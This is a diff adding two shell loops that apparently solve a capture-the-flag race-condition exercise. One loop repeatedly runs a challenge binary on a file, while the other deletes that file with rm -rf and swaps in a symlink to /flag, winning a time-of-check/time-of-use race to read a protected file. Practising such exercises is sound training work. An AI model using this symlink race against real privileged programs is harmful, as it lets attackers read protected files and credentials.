@@ -1,0 +1,3 @@
+while (true); do touch test; /challenges/race/level1_testing1 test; done
+
+while (true); do rm -rf test; ln -s /flag test; done
